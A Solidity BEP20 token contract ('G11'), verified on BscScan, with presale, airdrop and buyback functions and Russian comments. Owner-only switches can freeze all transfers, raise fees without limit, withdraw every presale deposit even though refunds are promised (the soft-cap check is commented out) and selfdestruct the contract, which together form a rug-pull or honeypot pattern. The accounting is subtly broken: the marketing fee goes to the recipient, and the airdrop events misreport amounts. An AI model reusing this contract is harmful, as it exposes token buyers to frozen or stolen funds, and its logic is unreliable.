/**
 *Submitted for verification at BscScan.com on 2021-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2021-06-26
*/

pragma solidity ^0.8.0;

interface IERC20 { // основной интерфейс токена BEP20
   
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount) external returns (bool);

   
    function allowance(address owner, address spender) external view returns (uint256); 

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
interface IERC20Metadata is IERC20 { // расширение  интерфейса токена BEP20 включает в себя имя, символ и количество знаков после запятой
  
    function name() external view returns (string memory);

   
    function symbol() external view returns (string memory);

   
    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


contract Token is Context, IERC20, IERC20Metadata { //собственно сам контракт токена
    
    mapping(address => uint256) public _balances; //массив балансов

    mapping(address => mapping(address => uint256)) public _allowances;

    uint256 public _totalSupply = 1000000000*10**18; //количество токенов вводить до первого знака умножения
    
    string public _name = "G11"; //Полное имя токена
    
    string public _symbol= "G11";//краткое имя токена
    
    bool public allowanceEnabled = true; // переменная блокирующая трансфер токенов между кошельками
    
    address payable public marketingAddress = payable(0xf3d355AA1442F7f505a0a224D740836786245B1C); // Marketing Address
    uint256 public marketingPercent = 2; 
    
    address public immutable burnAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public burnPercent = 8; 
    
    uint256 public marketingAmount;
    uint256 public burnAmount;
    
    function SetMarketingAddress(address payable  _marketingAddress) onlyOwner public {
        marketingAddress = _marketingAddress;
    }
    
    function SetMarketingPercent(uint256 _marketingPercent) onlyOwner public {
        marketingPercent = _marketingPercent;
    }
    
    function SetBurnPercent(uint256 _burnPercent) onlyOwner public {
        burnPercent = _burnPercent;
    }
    
    

    address public owner;
    
    function owned() public payable {
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    function changeOwner(address _owner) onlyOwner public {
        owner = _owner;
    }
    
 
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

  
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

   
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

   
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function ChangeAllowanceEnabled(bool _allowanceEnabled) onlyOwner public {
        allowanceEnabled = _allowanceEnabled;
    }
    
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        require(allowanceEnabled == true, "BEP20: transfer disabled.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

   
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
       
   
        burnAmount = amount * burnPercent / 100 ; 
        marketingAmount = amount * marketingPercent / 100; 
        
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        require(allowanceEnabled == true, "BEP20: transfer disabled");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        amount =  amount - marketingAmount - burnAmount;
        _balances[recipient] += amount;
        
        emit Transfer(sender, recipient, amount);
        
        if (marketingPercent > 0){
          
           _balances[recipient] += marketingAmount;
          emit Transfer(sender, marketingAddress, marketingAmount);  
            
        }
        
        if (burnPercent > 0){
            
           _totalSupply -= burnAmount;
           emit Transfer(sender, burnAddress, burnAmount);
            
        }
        
      
        
        
    }

   
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

  
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}



contract Presale is Token {
 
    address public CrowdAdress   = address(this); 
    uint256 public CrowdSupply   = 200000000*10**18; //количество токенов выставленное на пресейл
    uint256 public AirDrop       = 100000000*10**18; //количество токенов выставленное на аирдроп aAmt
    uint256 public aAmt          =    100000*10**18; //количество токенов аирдропа одному человеку
    uint256 public Price         =    100000*10**18; // Цена сколько токенов проекта отдаем за 1 эфир или 1 BNB
    uint256 public SoftCap       =         0*10**18; //софт кап минимальное токенов BNB не набрав которое мы не сможем вывести деньги
                                                     //хард кап в токенах BNB у нас равен CrowdSupply/Price                    
    uint256 public balancesOwner = _totalSupply-CrowdSupply-AirDrop; // сколько перечислено на кошелек овнера
    uint256 public PresaleBalance = 0;
    
    bool public PresaleStart = false;   // по умолчанию при развертывании пресейл выключен 
    bool public AirdropStart = true;    // по умолчанию при развертывании аирдроп включен 
    bool public PresaleBayback = false; // по умолчанию при развертывании выкуп средств за токены выключен. И его включаем если не набрали софткап
    
    function PresaleOnOf(bool _PresaleStart) onlyOwner public {
        PresaleStart = _PresaleStart;
    }
    
    function AirdropOnOf(bool _AirdropStart) onlyOwner public {
        AirdropStart = _AirdropStart;
    }
    
    function PresaleBaybackOnOf(bool _PresaleBayback) onlyOwner public {
        PresaleBayback = _PresaleBayback;
    }

    
   constructor ()  {
    owned();
    _balances[CrowdAdress] = CrowdSupply+AirDrop;
    _balances[owner] = balancesOwner;
    emit Transfer(CrowdAdress, owner, balancesOwner);
    }
    
    fallback() external payable {
        require(CrowdSupply > 0);//проверяем остались ли токены для пресейла
        require(PresaleStart == true, "PreSale is not active.");//проверяем включен ли пресейл
        uint256 tokensPerOneEther = Price; 
        uint256 tokens = tokensPerOneEther * msg.value / 10**18;
        if (tokens > _balances[CrowdAdress]) {
            tokens = _balances[CrowdAdress];
            uint valueWei = tokens * 10**18 / tokensPerOneEther;
            //emit Transfer(CrowdAdress, msg.sender, msg.value - valueWei);
            payable(msg.sender).transfer(msg.value - valueWei);
        }
        require(tokens > 0);
        _balances[msg.sender] += tokens;
        _balances[CrowdAdress] -= tokens; //списываем токены с баланса контракта
        CrowdSupply -= tokens; //списываем токены с условного баланса пресейла
        PresaleBalance += msg.value;// считаем сборы
       emit Transfer(CrowdAdress, msg.sender, tokens);
       //payable(owner).transfer(CrowdAdress.balance);
    }
    
        
    function bayback() public payable  {
            require(PresaleBayback == true, "PresaleBayback is not active.");//выкуп токенов если не набран софткап
           
            uint256 tokensBNB =  _balances[msg.sender] * 10 ** 18 / Price; //узнаем сколько выплатить BNB по балансу запросившего

            _balances[address(this)] += _balances[msg.sender];
   
            emit Transfer(msg.sender, address(this), _balances[msg.sender]);
            
            _balances[msg.sender]  = 0;
            
       payable(msg.sender).transfer(tokensBNB);
      // payable(msg.sender).transfer(CrowdAdress.balance, tokensBNB);
       
       
    }
    
    
    
    function getAirdrop(address _refer) public returns (bool success){
        
    require(AirDrop > 0);//проверяем остались ли токены для аирдропа
    require(AirdropStart == true, "Airdrop is not active.");//проверяем включен ли аирдроп
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      _balances[address(this)] -= aAmt / 2;
      _balances[_refer] += aAmt / 2;
      emit Transfer(address(this), _refer, aAmt );
    }
    
    _balances[address(this)] -= aAmt;
    _balances[msg.sender]  += aAmt;
    AirDrop  -= aAmt;
    emit Transfer(address(this), msg.sender, aAmt);
    return true;
    }
    

    
    
    function withdraw() public payable onlyOwner {
        //require(PresaleBalance > SoftCap);//проверяем набран ли софткап
        payable(owner).transfer(CrowdAdress.balance);
    }
    
    function killMe() public onlyOwner {
        selfdestruct(payable(owner));
    }
    
}